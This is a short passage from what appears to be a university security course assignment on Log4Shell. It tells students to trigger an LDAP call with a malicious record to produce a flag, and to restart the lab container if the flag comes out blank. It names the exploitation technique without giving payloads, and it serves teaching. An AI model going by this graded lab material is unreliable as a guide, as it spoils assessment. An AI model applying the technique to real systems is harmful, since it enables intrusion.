Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

Upon success, you should see your output similar to that below:

<strong>*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user.</strong> <strong>**</strong>***

https://github.gatech.edu/pages/cs6035-tools/cs6035-tools.github.io/Projects/Log4Shell/flag6.html&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2/2

&nbsp;
